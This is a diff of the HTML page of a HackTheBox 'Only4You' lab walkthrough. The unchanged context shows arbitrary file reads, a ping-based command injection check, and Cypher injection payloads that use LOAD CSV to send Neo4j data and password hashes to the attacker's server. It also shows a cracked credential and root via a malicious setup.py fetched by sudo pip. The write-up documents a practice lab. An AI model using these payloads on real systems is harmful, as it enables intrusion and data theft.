@@ -5,58 +5,62 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Only4You - HTB</title>
     <meta name="description" content="Artículos técnicos sobre ciberseguridad, Active Directory, Binary Exploitation y más">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css" rel="stylesheet">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.css" rel="stylesheet" media="print" onload="this.media='all'">
+    <noscript><link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.css" rel="stylesheet"></noscript>
     <link href="/css/styles.css" rel="stylesheet">
     <link href="/css/articles.css" rel="stylesheet">
     <link href="/css/monokai.css" rel="stylesheet">
     <link rel="icon" href="/favicon.ico" type="image/x-icon">
 </head>
 <body>
-    <button class="sidebar-toggle" id="sidebarToggle">☰</button>
+    <button class="sidebar-toggle" id="sidebarToggle"><i class="bi bi-list"></i></button>
     <div class="container-fluid">
         <div class="row">
             <!-- Sidebar -->
             <aside class="sidebar" id="sidebar">
                 <div class="sidebar-logo">
-                    <img src="/img/new-logo.png" alt="elswix Logo" onerror="this.src='https://via.placeholder.com/120/ff3b5c/ffffff?text=elswix'">
+                    <img width="160" height="160" src="/img/new-logo.png" alt="elswix Logo" onerror="this.src='https://via.placeholder.com/120/ff3b5c/ffffff?text=elswix'">
                     <h3>elswix</h3>
+                    <span class="sidebar-role">Red Team Database</span>
                 </div>
                 <nav>
                     <ul class="nav-menu">   
                         <li class="nav-item">
                             <a href="/" class="nav-link">
-                                <i>🏠</i>
+                                <i class="bi bi-house-door"></i>
                                 <span>Home</span>
                             </a>
                         </li>
                         <li class="nav-item">
                             <a href="/articles" class="nav-link active">
-                                <i>📝</i>
+                                <i class="bi bi-journal-code"></i>
                                 <span>Articles</span>
                             </a>
                         </li>
                         <li class="nav-item">
                             <a href="/writeups" class="nav-link">
-                                <i>💻</i>
+                                <i class="bi bi-terminal"></i>
                                 <span>WriteUps</span>
                             </a>
                         </li>
                         <li class="nav-item">
                             <a href="/notes" class="nav-link">
-                                <i>📚</i>
+                                <i class="bi bi-folder2-open"></i>
                                 <span>Notes</span>
                             </a>
                         </li>
                         <li class="nav-item">
                             <a href="https://github.com/elswix/KL-Sunset" target="_blank" class="nav-link">
-                                <i>⚡</i>
+                                <i class="bi bi-bug"></i>
                                 <span>KL-Sunset</span>
                             </a>
                         </li>
                         <li class="nav-item">
                             <a href="/about" class="nav-link">
-                                <i>👤</i>
+                                <i class="bi bi-person-badge"></i>
                                 <span>About me</span>
                             </a>
                         </li>
@@ -68,7 +72,7 @@
             <main>
                 <!-- Hero Section -->
                 <section class="hero mb-5">
-                    <img src="/writeups/htb/medium/only4you/img/only4you.png" alt="Article logo" style="width: 120px; height: 120px; border-radius: 50%" onerror="this.src='https://via.placeholder.com/140/ff3b5c/ffffff?text=📝'">
+                    <img src="/writeups/htb/medium/only4you/img/only4you.png" alt="Article logo" style="width: 120px; height: 120px; border-radius: 50%" onerror="this.src='https://via.placeholder.com/140/ff3b5c/ffffff?text=elswix'">
                     <h2>Only4You - HTB</h2>
                     <p>walkthrough by elswixHackTheBox</p>
                 </section>
@@ -146,12 +150,12 @@ With this done, we will begin recognizing the technologies used by the website f
 
 We don't see anything particularly interesting at the moment; we can only highlight an email address.<br/><br/>
 On the web front, we have the following:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/2.png"><br/><br/>
+<img width="1351" height="577" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/only4you/img/2.png"><br/><br/>
 <a href="https://www.wappalyzer.com/">Wappalyzer</a> shows us the following:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/3.png"><br/><br/>
+<img width="492" height="528" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/only4you/img/3.png"><br/><br/>
 There isn't anything interesting here either.<br/><br/>
 If we browse through the website a bit, there's a "Frequently Asked Questions" section in which there's one in particular that provides us with relevant information:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/4.png"/><br/><br/>
+<img width="947" height="407" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/only4you/img/4.png"/><br/><br/>
 The question "Are there some products available to check?" contains a hyperlink that leads us to a URL of a subdomain of the machine.<br/><br/>
 beta.only4you.htb<br/><br/>
 We add this domain to the /etc/hosts file.<br/><br/>
@@ -166,7 +170,7 @@ We add this domain to the /etc/hosts file.<br/><br/>
 </pre></div>
 
 At first glance on the website, there's a button that allows us to download source code, which I believe belongs to the source code of the page on this subdomain.<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/5.png"/><br/><br/>
+<img width="671" height="337" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/only4you/img/5.png"/><br/><br/>
 Once the file is downloaded, we can see that it's a zip file which contains the following files:<br/><br/>
 <div class="highlight"><pre><span></span><span class="n">beta</span>
 <span class="n">beta</span><span class="o">/</span><span class="n">app</span><span class="o">.</span><span class="n">py</span>
@@ -211,14 +215,14 @@ Here's the <code>download</code> function from main.py:<br/><br/>
 </pre></div>
 
 The request we need to make should be a POST request, specifying a parameter called <code>image</code>:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/8.png"/><br/><br/>
+<img width="1348" height="620" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/only4you/img/8.png"/><br/><br/>
 After conducting some tests, we can see that simply by providing the absolute path of the file we want to read, we can access it.<br/><br/>
 After a bit of research on the machine, I tried reading certain nginx configuration files to see what I could find. In this case, the file that revealed relevant information was:<br/><br/>
 <div class="highlight"><pre><span></span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">nginx</span><span class="o">/</span><span class="n">sites</span><span class="o">-</span><span class="n">available</span><span class="o">/</span><span class="n">default</span>
 </pre></div>
 
 In this case, it reveals certain information that we can use to our advantage:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/9.png"/><br/><br/>
+<img width="605" height="336" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/only4you/img/9.png"/><br/><br/>
 The pertinent information is the path where the main page is located, the one we had seen by accessing it with just the domain without specifying the subdomain:<br/><br/>
 <div class="highlight"><pre><span></span><span class="n">only4you</span><span class="o">.</span><span class="n">htb</span>
 </pre></div>
@@ -230,9 +234,9 @@ The path we found is as follows:<br/><br/>
 You might think about conducting fuzzing on this directory, but in my case, it wasn't necessary. I simply tried files that would likely exist in the directory, such as: app.py<br/><br/>
 <div class="highlight"><pre><span></span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">only4you</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">app</span><span class="o">.</span><span class="n">py</span>
 </pre></div>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/10.png"/><br/><br/>
+<img width="1340" height="527" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/only4you/img/10.png"/><br/><br/>
 This file caught my attention because it only contained information about the contact section of the main page, which is a form for supposedly sending a message:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/11.png"/><br/><br/>
+<img width="1245" height="382" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/only4you/img/11.png"/><br/><br/>
 In this case, to analyze the code more thoroughly, I made a curl request to access the file:<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">elswix@parrot</span><span class="err">$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">beta</span><span class="o">.</span><span class="n">only4you</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">download</span> <span class="o">-</span><span class="n">d</span> <span class="s2">"image=/var/www/only4you.htb/app.py"</span>
 </pre></div>
@@ -266,13 +270,13 @@ The idea is as follows: we will intercept the request from the main page's form 
 Let's not forget to URL-encode our payload:<br/><br/>
 <div class="highlight"><pre><span></span><span class="n">ping</span> <span class="o">-</span><span class="n">c</span> <span class="mi">1</span> <span class="mf">10.10.16.4</span>
 </pre></div>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/12.png"/><br/><br/>
+<img width="846" height="472" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/only4you/img/12.png"/><br/><br/>
 First, we put ourselves in listening mode from our machine using tcpdump:<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">elswix@parrot</span><span class="err">$</span> <span class="n">tcpdump</span> <span class="o">-</span><span class="n">i</span> <span class="n">tun0</span> <span class="n">icmp</span> <span class="o">-</span><span class="n">n</span>
 </pre></div>
 
 And we send the request:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/14.png"/><br/><br/>
+<img width="891" height="132" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/only4you/img/14.png"/><br/><br/>
 As we can see, we have received the trace, and we have achieved remote command execution (RCE).<br/><br/>
 <h3><br/>Shell as www-data</h3><br/>
 With that done, now we will attempt to send a TCP Reverse Shell to our attacker machine. To do this, we will create an <code>index.html</code> file in which we will store a malicious payload written in bash that sends us a Reverse Shell.<br><br/>
@@ -295,7 +299,7 @@ The idea is to create an HTTP server in Python that serves the index.html file, 
 </pre></div>
 
 Once the listening servers are ready, we will send the request:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/15.png"/><br/><br/>
+<img width="594" height="336" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/only4you/img/15.png"/><br/><br/>
 Finally, we obtain a shell:<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">elswix@parrot</span><span class="err">$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">443</span>
 <span class="n">Ncat</span><span class="p">:</span> <span class="n">Version</span> <span class="mf">7.92</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">ncat</span> <span class="p">)</span>
@@ -361,7 +365,7 @@ Now, on the victim machine, we connect as a client:<br/><br/>
 </pre></div>
 
 Now, if we try to access the web service through our browser, we can enter it successfully, and it redirects us to the <code>/login</code> resource:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/16.png"/><br/><br/>
+<img width="1348" height="623" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/only4you/img/16.png"/><br/><br/>
 If we try default credentials, the most commonly used ones could be:<br/><br/>
 <div class="highlight"><pre><span></span><span class="n">username</span><span class="p">:</span> <span class="n">user</span>
 <span class="n">password</span><span class="p">:</span> <span class="n">user</span>
@@ -374,57 +378,57 @@ If we try default credentials, the most commonly used ones could be:<br/><br/>
 </pre></div>
 
 Among many others, and in our case, admin - admin worked. <br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/17.png"/><br/><br/>
+<img width="1351" height="626" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/only4you/img/17.png"/><br/><br/>
 We managed to access the web with the correct credentials.<br/><br/>
 If we take a look at <code>/dashboard</code>, we can see a section called "Tasks" that appears to contain tasks that the admin user must complete or certain reminders for the admin user.<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/18.png"/><br/><br/>
+<img width="1060" height="439" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/only4you/img/18.png"/><br/><br/>
 Here they mention something about <a href="https://neo4j.com/">Neo4j</a>, so I believe they might be using this type of database for certain resources or services.<br/><br/>
 In the <code>/employees</code> resource, we can see that we can enter certain information. It seems to be a search section that allows us to filter by users or, as the name suggests, employees.<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/19.png"/><br/><br/>
+<img width="1348" height="577" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/only4you/img/19.png"/><br/><br/>
 If we enter a character, for example, "a," we can see that the content of the page changes, and it returns some information:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/20.png"/><br/><br/>
+<img width="1351" height="534" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/only4you/img/20.png"/><br/><br/>
 At first glance, it appears that there is a database query running in the background that filters the information based on what we provide in the search box.<br/><br/>
 This could be critical if implemented improperly, as entering a malicious payload could lead to a SQL Injection vulnerability.<br/><br/>
 <h3><br/>Cypher Injection:</h3><br/>
 To test this, we will enter a single quote in the search box:<br><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/21.png"/><br/><br/>
+<img width="1350" height="624" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/only4you/img/21.png"/><br/><br/>
 We can see that an error has occurred as indicated by the status code 500.<br/><br/>
 I would like to assume that the search box uses a Neo4j database, so if we search the internet for ways to exploit Neo4j, we come across Cypher Injection.<br/><br/>
 In my case, I will use payloads from <a href="https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j">HackTricks</a> to perform the exploitation.<br/><br/>
 One of the first payloads I'm going to try is the one to extract the version of the Neo4j server:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/22.png"/><br/><br/>
+<img width="905" height="284" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/only4you/img/22.png"/><br/><br/>
 We need to adapt the payload slightly for our case by changing the initial URL to ours:<br/><br/>
 <div class="highlight"><pre><span></span><span class="k">OR</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">WITH</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="k">CALL</span><span class="w"> </span><span class="n">dbms</span><span class="p">.</span><span class="n">components</span><span class="p">()</span><span class="w"> </span><span class="n">YIELD</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="k">versions</span><span class="p">,</span><span class="w"> </span><span class="n">edition</span><span class="w"> </span><span class="n">UNWIND</span><span class="w"> </span><span class="k">versions</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="k">version</span><span class="w"> </span><span class="k">LOAD</span><span class="w"> </span><span class="n">CSV</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="s1">'http://10.10.16.4:8000/?version='</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="k">version</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'&amp;name='</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'&amp;edition='</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">edition</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">l</span><span class="w"> </span><span class="k">RETURN</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">_0</span><span class="w"> </span><span class="o">//</span>
 </pre></div>
 
 For convenience, I will use Burp Suite to send the requests. We will also URL encode all payloads (don't forget the single quotation mark at the beginning):<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/23.png"/><br/><br/>
+<img width="1340" height="543" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/only4you/img/23.png"/><br/><br/>
 After sending the payload, if we check our web server, we can see the request with the version of the Neo4j server:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/25.png"/><br/><br/>
+<img width="1313" height="431" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/only4you/img/25.png"/><br/><br/>
 If we continue to try the payloads offered by HackTricks, we will notice that none of the others work. However, we can attempt further enumeration by modifying the payload that works.<br/><br/>
 In this case, we will enumerate the labels the server has, modifying the previous payload since the one offered by HackTricks doesn't work:<br/><br/>
 <div class="highlight"><pre><span></span><span class="k">OR</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">WITH</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="k">CALL</span><span class="w"> </span><span class="n">db</span><span class="p">.</span><span class="n">labels</span><span class="p">()</span><span class="w"> </span><span class="n">YIELD</span><span class="w"> </span><span class="n">label</span><span class="w"> </span><span class="k">LOAD</span><span class="w"> </span><span class="n">CSV</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="s1">'http://10.10.16.4:8000/?label='</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">label</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">l</span><span class="w"> </span><span class="k">RETURN</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">_0</span><span class="w"> </span><span class="o">//</span>
 </pre></div>
 
 We send the request and receive the following on our server:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/26.png"/><br/><br/>
+<img width="799" height="243" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/only4you/img/26.png"/><br/><br/>
 We can see that we receive the names of the labels, and one of them is "user," which is interesting because it might contain stored credentials.<br/><br/>
 <h3><br/>Shell as john:</h3><br/>
 By reading further in HackTricks, we can see that we can obtain the properties of a key:<br><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/27.png"/><br/><br/>
+<img width="911" height="207" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/only4you/img/27.png"/><br/><br/>
 We will try to modify the payload slightly, adapting our values (don't forget the single quotation mark at the beginning):<br/><br/>
 <div class="highlight"><pre><span></span><span class="k">OR</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">WITH</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="k">MATCH</span><span class="w"> </span><span class="p">(</span><span class="n">u</span><span class="p">:</span><span class="k">user</span><span class="p">)</span><span class="w"> </span><span class="n">UNWIND</span><span class="w"> </span><span class="n">keys</span><span class="p">(</span><span class="n">u</span><span class="p">)</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">p</span><span class="w"> </span><span class="k">LOAD</span><span class="w"> </span><span class="n">CSV</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="s1">'http://10.10.16.4:8000/?'</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">p</span><span class="w"> </span><span class="o">+</span><span class="s1">'='</span><span class="o">+</span><span class="n">toString</span><span class="p">(</span><span class="n">u</span><span class="p">[</span><span class="n">p</span><span class="p">])</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">l</span><span class="w"> </span><span class="k">RETURN</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">_0</span><span class="w"> </span><span class="o">//</span>
 </pre></div>
 
 Then we will send the request with our listening server, and if all goes well, we will receive the following:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/29.png"/><br/><br/>
+<img width="1325" height="198" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/only4you/img/29.png"/><br/><br/>
 It seems to have worked, and we obtained hashed usernames and passwords. The most interesting one here is John's password. Be careful because the hash appears first, and then the username, which can be confusing and lead you to copy the wrong hash.<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">elswix@parrot</span><span class="err">$</span> <span class="n">cat</span> <span class="nb">hash</span> 
 <span class="n">a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6</span>
 </pre></div>
 
 We will crack the hash using brute force with the John the Ripper tool, specifying the correct format:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/30.png"/><br/><br/>
+<img width="957" height="213" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/only4you/img/30.png"/><br/><br/>
 We can see that the John the Ripper tool has successfully cracked the hash, and we obtained the user's password.<br/><br/>
 <div class="highlight"><pre><span></span><span class="n">john</span><span class="p">:</span><span class="n">ThisIs4You</span>
 </pre></div>
@@ -453,11 +457,11 @@ The user "john" can execute the command as root without specifying his password:
 </pre></div>
 
 It seems that it's trying to download a Python package from a remote server. To abuse this, we need to see what's on port 3000 of the victim machine. I accomplished this by using chisel once again.<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/32.png"/><br/><br/>
+<img width="1349" height="616" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/only4you/img/32.png"/><br/><br/>
 It seems that the web service uses Gogs, which is a service that provides the ability to host Git repositories.<br/><br/>
 We can log in using the credentials we already have for the user "john."<br/><br/>
 We can see that there is a "test" repository:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/33.png"/><br/><br/>
+<img width="1344" height="578" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/only4you/img/33.png"/><br/><br/>
 Reading some <a href="https://embracethered.com/blog/posts/2022/python-package-manager-install-and-download-vulnerability/">documentation</a> on how to exploit pip, I found that if the Python package format is <code>.tar.gz</code>, when you run the <code>pip download</code> command, it will execute a <code>setup.py</code> file found within the package being downloaded.<br/><br/>
 The idea here is to upload a malicious <code>setup.py</code> file and then copy the URL of the Git repository in <code>.tar.gz</code> format.<br/><br/>
 First, let's create the malicious setup.py file:<br/><br/>
@@ -469,12 +473,12 @@ First, let's create the malicious setup.py file:<br/><br/>
 
 What we will do is, when we run the <code>pip download</code> on this repository, it will interpret the <code>setup.py</code> file, which will execute the command <code>chmod u+s /bin/bash</code> to assign Set-UID privileges to the bash.<br/><br/>
 First, let's make sure the test repository is not private:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/39.png"/><br/><br/>
+<img width="1312" height="623" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/only4you/img/39.png"/><br/><br/>
 We upload the file <code>setup.py</code>:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/35.png"/><br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/36.png"/><br/><br/>
+<img width="1006" height="208" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/only4you/img/35.png"/><br/><br/>
+<img width="1053" height="408" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/only4you/img/36.png"/><br/><br/>
 We have to copy <code>tar.gz</code> :<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/38.png"/><br/><br/>
+<img width="593" height="168" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/only4you/img/38.png"/><br/><br/>
 And finally we execute the command that we can run as root with sudo:<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">john@only4you</span><span class="err">$</span> <span class="n">sudo</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">pip3</span> <span class="n">download</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">127.0.0.1</span><span class="p">:</span><span class="mi">3000</span><span class="o">/</span><span class="n">john</span><span class="o">/</span><span class="n">Test</span><span class="o">/</span><span class="n">archive</span><span class="o">/</span><span class="n">master</span><span class="o">.</span><span class="n">tar</span><span class="o">.</span><span class="n">gz</span>
 </pre></div>
